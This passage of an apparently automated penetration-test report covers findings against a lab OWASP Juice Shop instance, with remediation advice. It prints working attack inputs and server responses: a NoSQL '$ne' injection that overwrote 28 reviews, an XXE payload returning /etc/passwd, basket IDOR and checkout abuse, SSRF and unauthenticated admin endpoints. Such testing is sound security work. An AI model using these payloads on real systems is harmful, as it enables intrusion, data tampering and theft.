Enforce object-level authorization on every user-scoped resource read and write path.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-basket-1-idor.txt

```text
URL: http://192.168.1.221:3001/rest/basket/1
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 1310
ETag: W/"51e-86QAGG4vUaoZoxJwwb6DKfhXm1g"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Body Snippet:
{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2026-04-20T15:56:24.217Z","updatedAt":"2026-04-20T15:56:24.217Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-04-20T15:56:23.907Z","updatedAt":"2026-04-20T15:56:23.907Z","deletedAt":null,"BasketItem":{"ProductId":1,"BasketId":1,"id":1,"quantity":5,"createdAt":"2026-04-20T15:56:24.371Z","updatedAt":"2026-04-20T21:37:35.272Z"}},{"id":2,"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","createdAt":"2026-04-20T15:56:23.907Z","updatedAt":"2026-04-20T15:56:23.907Z","deletedAt":null,"BasketItem":{"ProductId":2,"BasketId":1,"id":2,"quantity":3,"createdAt":"2026-04-20T15:56:24.371Z","updatedAt":"2026-04-20T15:56:24.371Z"}},{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"deluxePrice":8.99,"image":"eggfruit_juice.jpg","createdAt":"2026-04-20T15:56:23.907Z","updatedAt":"2026-04-20T15:56:23.907Z","deletedAt":null,"BasketItem":{"ProductId":3,"BasketId":1,"id":3,"quantity":1,"createdAt":"2026-04-20T15:56:24.371Z","updatedAt":"2026-04-20T15:56:24.371Z"}}]}}
```

### 12. NoSQL operator injection signal: PATCH /rest/products/reviews
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, persistence-adjacent
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Object-operator input in review update was accepted, indicating missing operator sanitization.

**Proof Of Concept**
PATCH review endpoint using object/operator input in id selector.

**Evidence**
`PATCH http://192.168.1.221:3001/rest/products/reviews` accepted `$ne` operator-style payload.

**Remediation**
Enforce strict schema validation for scalar fields and block operator objects in update selectors.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-products-reviews-nosql-operator.txt

```text
URL: http://192.168.1.221:3001/rest/products/reviews
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 7688
ETag: W/"1e08-dGP1BRO2bxLAM5/qzAye0t7x9So"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Request JSON:
{
  "id": {
    "$ne": -1
  },
  "message": "vantix validation marker"
}

Body Snippet:
{"modified":28,"original":[{"message":"vantix validation marker","author":"wurstbrot@juice-sh.op","product":46,"likesCount":0,"likedBy":[],"_id":"4FYHo8RPGEE5TuW24"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"5CxqmpKDA9dhB8QAz"},{"message":"vantix validation marker","author":"bjoern@owasp.org","product":45,"likesCount":0,"likedBy":[],"_id":"5XNFjXazoFjXo3MXY"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":20,"likesCount":0,"likedBy":[],"_id":"5jvo45oH3RSYkwky6"},{"message":"vantix validation marker","author":"jim@juice-sh.op","product":22,"likesCount":0,"likedBy":[],"_id":"6mAaCDgThBN5AybFu"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":38,"likesCount":0,"likedBy":[],"_id":"7bc7jcTdz7wQM9tKn"},{"message":"vantix validation marker","author":"stan@juice-sh.op","product":42,"likesCount":0,"likedBy":[],"_id":"8Xennz3djvEbLnwMb"},{"message":"vantix validation marker","author":"accountant@juice-sh.op","product":43,"likesCount":0,"likedBy":[],"_id":"9cs5WaLqYZtvJNX8x"},{"message":"vantix validation marker","author":"jim@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"FsJdDe7BuZYTzPH4d"},{"message":"vantix validation marker","author":"bjoern@owasp.org","product":44,"likesCount":0,"likedBy":[],"_id":"J9q57NrprG5PX6oXq"},{"message":"vantix validation marker","author":"uvogin@juice-sh.op","product":38,"likesCount":0,"likedBy":[],"_id":"KaRvi2WoMweAoki4N"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":17,"likesCount":0,"likedBy":[],"_id":"Kp5oJoyTavyHuwSPX"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"LQKn54MMjXvAWgCpA"},{"message":"vantix validation marker","author":"uvogin@juice-sh.op","product":30,"likesCount":0,"likedBy":[],"_id":"MHK3womebpkrcJdeF"},{"message":"vantix validation marker","author":"admin@juice-sh.op","product":3,"likesCount":0,"likedBy":[],"_id":"MWMF9Wf4fq4eN29RX"},{"message":"vantix validation marker","author":"bjoern@owasp.org","product":35,"likesCount":0,"likedBy":[],"_id":"Nca4WXsvK52jaFhpr"},{"message":"vantix validation marker","author":"uvogin@juice-sh.op","product":2,"likesCount":0,"likedBy":[],"_id":"QAkqiw8bDqhvXX2gp"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":42,"likesCount":0,"likedBy":[],"_id":"RaJ48hrDmEuXaCy8r"},{"message":"vantix validation marker","author":"jim@juice-sh.op","product":20,"likesCount":0,"likedBy":[],"_id":"W2KZQGLpWJgSWMTrA"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":39,"likesCount":0,"likedBy":[],"_id":"XiZas7o9PgJsJbgoB"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":6,"likesCount":0,"likedBy":[],"_id":"bjGQYmGjBWspDCa3X"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":40,"likesCount":0,"likedBy":[],"_id":"bpSsCRFrkvkMaLMsB"},{"message":"vantix validation marker","author":"J12934@juice-sh.op","product":46,"likesCount":0,"likedBy":[],"_id":"eJBynd4x6XJtZ4ANL"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":36,"likesCount":0,"likedBy":[],"_id":"i37aupWbj6R2AGdbS"},{"message":"vantix validation marker","author":"bjoern@owasp.org","product":46,"likesCount":0,"likedBy":[],"_id":"iWz3Bce8e84Ss9sif"},{"message":"vantix validation marker","author":"morty@juice-sh.op","product":32,"likesCount":0,"likedBy":[],"_id":"kASkqgwiCbFSkrzuW"},{"message":"vantix validation marker","author":"admin@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"sRixxC7XqQzMRWAwP"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":41,"likesCount":0,"likedBy":[],"_id":"zi4fw7kLNNGHNYRnW"}],"updated":[{"message":"vantix validation marker","author":"wurstbrot@juice-sh.op","product":46,"likesCount":0,"likedBy":[],"_id":"4FYHo8RPGEE5TuW24"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"5CxqmpKDA9dhB8QAz"},{"message":"vantix validation marker","author":"bjoern@owasp.org","product":45,"likesCount":0,"likedBy":[],"_id":"5XNFjXazoFjXo3MXY"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":20,"likesCount":0,"likedBy":[],"_id":"5jvo45oH3RSYkwky6"},{"message":"vantix validation marker","author":"jim@juice-sh.op","product":22,"likesCount":0,"likedBy":[],"_id":"6mAaCDgThBN5AybFu"},{"message":"vantix validation marker","author":"bender@juice-sh.op","product":38,"likesCount":0,"likedBy":[],"_id":"7bc7jcTdz7wQM9tKn"},{"message":"vantix validation marker","author":"stan@juice-sh.op","product":42,"likesCount":0,"likedBy":[],"_id":"8Xennz3djvEbLnwMb"},{"message":"vantix validation marker","author":"accountant@juice-sh.op","product":43,"likesCount":0,"likedBy":[],"_id":"9cs5WaLqYZtvJNX8x"},{"message":"vantix validation marker","author":"jim@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"FsJdDe7BuZYTzPH4d"},{"message":"vantix validation marker","author":"bjoern@owasp.org","product":44,"likesCount":0,"likedBy":[],"_id":"J9q57NrprG5PX6oXq"},{"message":"vantix validation marker","author":"uvogin@juice-sh.op","product":38,"likesCount":0,"likedBy":[],"_id":"KaRvi2WoMweAoki4N"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":17,"likesCount":0,"likedBy":[],"_id":"Kp5oJoyTavyHuwSPX"},{"message":"vantix validation marker","author":"mc.safesearch@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"LQKn54MMjXvAWgCpA"},{"message":"vantix validation marker","author":"uvogin@juice-sh.op","product":30,"likesCount":0,"likedBy":[],"_id":"MHK3womebpkrcJdeF"},{"message":"vantix validation marker","author":"admin@juice-sh.op","product":3,"likesCount":0,"likedBy":[],"_id":"MWMF9Wf4fq4eN29RX"},{"message":"vantix validation marker","author":"bjoern@owasp.org","product":35,"lik
```

### 13. XXE file disclosure signal: POST /file-upload
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, server-local-read, persistence-adjacent
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; single local-read proof request; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: XML upload processing resolved external entities and exposed host file content markers.

**Proof Of Concept**
Upload XML containing external entity reference to a local file and inspect response.

**Evidence**
`POST http://192.168.1.221:3001/file-upload` with XML entity payload returned filesystem markers.

**Remediation**
Disable external entity resolution and DTD processing for all XML parsers.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/file-upload-xxe.txt

```text
URL: http://192.168.1.221:3001/file-upload
Status: 410
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close
Transfer-Encoding: chunked

Body Snippet:
<html>
  <head>
    <meta charset='utf-8'> 
    <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin&lt;/foo&gt; (vantix-xxe.xml)</title>
    <style>* {
  margin: 0;
  padding: 0;
  outline: 0;
}

body {
  padding: 80px 100px;
  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
  background-repeat: no-repeat;
  color: #555;
  -webkit-font-smoothing: antialiased;
}
h1, h2 {
  font-size: 22px;
  color: #343434;
}
h1 em, h2 em {
  padding: 0 5px;
  font-weight: normal;
}
h1 {
  font-size: 60px;
}
h2 {
  margin-top: 10px;
}
ul li {
  list-style: none;
}
#stacktrace {
  margin-left: 60px;
}
</style>
  </head>
  <body>
    <div id="wrapper">
      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
      <h2><em>410</em> Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin&lt;/foo&gt; (vantix-xxe.xml)</h2>
      <ul id="stacktrace"><li> &nbsp; &nbsp;at handleXmlUpload (/juice-shop/build/routes/fileUpload.js:119:22)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at handleZipFileUpload (/juice-shop/build/routes/fileUpload.js:88:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkFileType (/juice-shop/build/routes/fileUpload.js:104:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkUploadSize (/juice-shop/build/routes/fileUpload.js:96:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at /juice-shop/build/routes/metrics.js:84:9</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at ensureFileIsPassed (/juice-shop/build/routes/fileUpload.js:46:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at done (/juice-shop/node_modules/multer/lib/make-middleware.js:47:7)</li><li> &nbsp; &nbsp;at indicateDone (/juice-shop/node_modules/multer/lib/make-middleware.js:51:68)</li><li> &nbsp; &nbsp;at Multipart.&lt;anonymous&gt; (/juice-shop/node_modules/multer/lib/make-middleware.js:168:7)</li><li> &nbsp; &nbsp;at Multipart.emit (node:events:508:28)</li></ul>
    </div>
  </body>
</html>
```

### 14. Regular user product creation authorization signal
- Severity: HIGH
- Status: validated
- Confidence: 0.85
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, rce-adjacent, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Product creation endpoint accepted a non-admin token, indicating missing role enforcement.

**Proof Of Concept**
Register/login as regular user and POST to product creation endpoint.

**Evidence**
`POST http://192.168.1.221:3001/api/Products` returned success for a regular account.

**Remediation**
Restrict product-management endpoints to privileged roles with server-side policy checks.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/api-Products-post-regular-user.txt

```text
URL: http://192.168.1.221:3001/api/Products
Status: 201
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Location: /api/Products/58
Content-Type: application/json; charset=utf-8
Content-Length: 259
ETag: W/"103-5vzZo8sDXZY08cnHBdJDl8/S6Ks"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Request JSON:
{
  "name": "Vantix Test Product 1776911494411",
  "description": "authorization check",
  "price": 9.99,
  "image": "x.jpg"
}

Body Snippet:
{"status":"success","data":{"id":58,"name":"Vantix Test Product 1776911494411","description":"authorization check","price":9.99,"image":"x.jpg","updatedAt":"2026-04-23T02:31:34.599Z","createdAt":"2026-04-23T02:31:34.599Z","deluxePrice":null,"deletedAt":null}}
```

### 15. Cross-user basket item modification signal
- Severity: HIGH
- Status: validated
- Confidence: 0.84
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Authenticated basket-item update succeeded on a fixed object id, indicating possible write-level IDOR.

**Proof Of Concept**
PUT http://192.168.1.221:3001/api/BasketItems/1 with a non-owner token and `{"quantity": 5}`.

**Evidence**
`PUT http://192.168.1.221:3001/api/BasketItems/1` returned HTTP 200 with updated quantity.

**Remediation**
Authorize write operations against ownership/role policy before mutating basket items.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/api-BasketItems-1-put.txt

```text
URL: http://192.168.1.221:3001/api/BasketItems/1
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 154
ETag: W/"9a-25o9JJkXuAOhzRzwxSEpAcePO6U"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Request JSON:
{
  "quantity": 5
}

Body Snippet:
{"status":"success","data":{"ProductId":1,"BasketId":1,"id":1,"quantity":5,"createdAt":"2026-04-20T15:56:24.371Z","updatedAt":"2026-04-20T21:37:35.272Z"}}
```

### 16. Cross-user basket checkout signal
- Severity: HIGH
- Status: validated
- Confidence: 0.83
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Checkout succeeded for a fixed basket id, suggesting missing ownership checks on order execution.

**Proof Of Concept**
POST http://192.168.1.221:3001/rest/basket/2/checkout with a non-owner token.

**Evidence**
`POST http://192.168.1.221:3001/rest/basket/2/checkout` returned order confirmation markers.

**Remediation**
Bind checkout operations to the authenticated principal’s basket only.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-basket-2-checkout.txt

```text
URL: http://192.168.1.221:3001/rest/basket/2/checkout
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 45
ETag: W/"2d-Z+wGJsp14kjPNXRPlPEdo33qFuw"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Request JSON:
{}

Body Snippet:
{"orderConfirmation":"5267-93175addcce841dd"}
```

### 17. SSRF internal fetch signal: /profile/image/url
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, persistence-adjacent, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: URL-ingestion endpoint accepted an internal application URL and returned internal-fetch response markers.

**Proof Of Concept**
POST http://192.168.1.221:3001/profile/image/url with `imageUrl` pointing to `http://192.168.1.221:3001/rest/admin/application-version`.

**Evidence**
`POST http://192.168.1.221:3001/profile/image/url` with internal `imageUrl` returned application markers.

**Remediation**
Block private/link-local/internal destinations, enforce strict URL allowlists, and apply identical validation across HTTP methods.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/profile-image-url-ssrf-internal-fetch.txt

```text
URL: http://192.168.1.221:3001/profile/image/url
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Security-Policy: img-src 'self' assets/public/images/uploads/defaultAdmin.png; script-src 'self' 'unsafe-eval'
Content-Type: text/html; charset=utf-8
Content-Length: 6152
ETag: W/"1808-UyyENhRDZzOid5c2k95vydI0A1k"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Request JSON:
{
  "imageUrl": "http://192.168.1.221:3001/rest/admin/application-version"
}

Body Snippet:
<!DOCTYPE html><html lang="en"><head><title>OWASP Juice Shop</title><meta charset="utf-8"><meta name="description" content=""><meta name="keywords" content=""><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="./assets/public/favicon_js.ico"><link rel="stylesheet" href="/vendor/material-design-lite/material.min.css"><link rel="stylesheet" href="/vendor/material-icons/material-icons.css"><link rel="stylesheet" href="./assets/public/css/userProfile.css" type="text/css"><link rel="stylesheet" href="./assets/public/css/roboto.css" type="text/css"><script src="/vendor/material-design-lite/material.min.js"></script><style>.mdl-textfield__input {
border-bottom: 1px solid #FFFFFF !important;
font-size: 13px !important;
}</style></head><body style="background: #303030;color:#FFFFFF;"><div class="mdl-layout mdl-js-layout mdl-layout--fixed-header"><header class="mdl-layout__header mdl-shadow--8dp" style="background: #546E7A; height: auto; min-width: 100%; padding-bottom: 5px; width: 100%;"><div class="mdl-layout__header-row"><a href="./#/" style="color: #FFFFFF; text-decoration:none; margin-left: -50px;"><i class="material-icons" style="display: block;margin-bottom: auto;margin-top: auto; margin-right: 10px;">arrow_back</i></a><a href="./#/" style="color: #FFFFFF; text-decoration:none;"><span style="margin-right: 20px;">Back</span></a><!-- Logo--><a href="./#/"><img src="assets/public/images/JuiceShop_Logo.png" style="max-height: 60px; width: auto;" alt="OWASP Juice Shop Logo"></a><!-- Title--><a href="./#/" style="color: #FFFFFF; text-decoration:none;"><span class="mdl-layout-title" style="font: 500 20px/32px Roboto,&quot;Helvetica Neue&quot;,sans-serif;">OWASP Juice Shop</span></a></div></header></div><main class="mdl-layout__content" style=" display: block; margin-left: auto; margin-right:auto;"><section class="section--center mdl-grid mdl-grid--no-spacing"><div class="mdl-card mdl-cell mdl-cell--12-col mdl-shadow--8dp" id="card" style="height: auto; min-width: 300px;  width: 40%; display: block; margin-left: auto; margin-right:auto; background: #424242; margin-bottom: 50px; margin-top: 110px;"><div class="mdl-card__supporting-text mdl-grid mdl-grid--no-spacing"><h1 class="mdl-cell mdl-cell--12-col" style="color: #FFFFFF; font-size: 24px; line-height: 32px; margin-top: 16px; margin-bottom: 16px; font-weight: 400;">User Profile</h1><div class="mdl-cell mdl-cell--6-col-desktop mdl-cell--12-col-tablet mdl-cell--12-col-phone"><img class="img-rounded" src="assets/public/images/uploads/defaultAdmin.png" alt="profile picture" width="90%" height="236" style="margin-right: 5%; margin-left: 5%;"><p style="margin-top:8%; color: #FFFFFF; text-align: center;">\</p><form action="./profile/image/file" style="margin-top:10%; width: 90%; margin-right: auto; margin-left: auto;" method="post" enctype="multipart/form-data"><div class="form-group"><label for="picture" style="color: #FFFFFF; font-size: 12px;">File Upload:</label><input id="picture" type="file" accept="image/*" name="file" size="150" style="color: #FFFFFF; margin-top: 4px;" aria-label="Input for selecting the profile picture"><div class="mdl-tooltip" for="picture" style="width: 150px; text-align: left;">&bull; Maximum file size 150Kb<br>&bull; All image formats are accepted</div></div><button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" type="submit" style="background-color:#546E7A; color: #FFFFFF; margin-top: 3%; text-transform: capitalize;" aria-label="Button to upload the profile picture">Upload Picture</button></form><div class="breakLine" style="margin-top: 3%; margin-bottom: 3%; width: 90%; margin-right: auto; margin-left: auto;"><div class="line"><div></div></div><div class="textOnLine" style="color: #FFFFFF;">or</div><div class="line"><div></div></div></div><form action="./profile/image/url" style="margin-top:5%; width: 90%; margin-right: auto; margin-left: auto;" method="post"><div class="form-group"><div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 100%;"><input class="form-control mdl-textfield__input" id="url" type="text" name="imageUrl" style="color: #FFFFFF;" placeholder="e.g. https://www.gravatar.com/avatar/526703ac2bd7cd675e872393a0744bf5" aria-label="Text field for the image link"><label class="mdl-textfield__label" for="url" style="color: #FFFFFF;">Image URL:</label></div></div><button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" id="submitUrl" type="submit" style="background-color:#546E7A; color: #FFFFFF; margin-top: -10px; text-transform: capitalize;" aria-label="Button to include image from link">Link Image</button><p style="margin-bottom:10%;"></p></form></div><div class="mdl-cell mdl-cell--6-col-desktop mdl-cell--12-col-tablet mdl-cell--12-col-phone"><form action="./profile" method="post" style="width: 90%; margin-right: auto; margin-left: auto;"><div class="form-group"><div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 100%; opacity: 0.7"><input class="form-control mdl-textfield__input" id="email" type="email" name="email" value="admin@juice-sh.op" disabled style="color: #FFFFFF;" aria-label="Disabled - Text field for the email"><label class="mdl-textfield__label" for="email" style="color: #FFFFFF;">Email:</label></div></div><div class="form-group"><div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" style="width: 100%;"><input class="form-control mdl-textfield__input" id="username" type="text" name="username" value="" style="color: #FFFFFF;" placeholder="e.g. SuperUser" aria-label="Text field for the username"><label class="mdl-textfield__label" for="username" style="color: #FFFFFF;">Username:</label></div></div><button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" id="submit" type="submit" style="background-color:#546E7A; color: #FFFFFF; margin-top: -10px; text-transform: capitalize;" aria
```

### 18. Unauthenticated sensitive endpoint exposure: GET /ftp/
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Endpoint `/ftp/` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://192.168.1.221:3001/ftp/ without authentication

**Evidence**
http://192.168.1.221:3001/ftp/ returned HTTP 200 unauthenticated.

**Remediation**
Require authentication and authorization checks for sensitive endpoints and files.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/ftp.txt

```text
URL: http://192.168.1.221:3001/ftp/
Status: 200
Content-Type: text/html; charset=utf-8

Snippet:
<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>listing directory /ftp/</title>
    <style>* {
  margin: 0;
  padding: 0;
  outline: 0;
}

body {
  padding: 80px 100px;
  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
  background-repeat: no-repeat;
  color: #555;
  -webkit-font-smoothing: antialiased;
}
h1, h2, h3 {
  font-size: 22px;
  color: #343434;
}
h1 em, h2 em {
  padding: 0 5px;
  font-weight: normal;
}
h1 {
  font-size: 60px;
}
h2 {
  margin-top: 10px;
}
h3 {
  margin: 5px 0 10px 0;
  pa
```

### 19. Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-configuration
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Endpoint `/rest/admin/application-configuration` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://192.168.1.221:3001/rest/admin/application-configuration without authentication

**Evidence**
http://192.168.1.221:3001/rest/admin/application-configuration returned HTTP 200 unauthenticated.

**Remediation**
Require authentication and authorization checks for sensitive endpoints and files.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-admin-application-configuration.txt

```text
URL: http://192.168.1.221:3001/rest/admin/application-configuration
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 21770
ETag: W/"550a-OEo3agZPnY9Z7Todze3/X9Rt2J8"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Body Snippet:
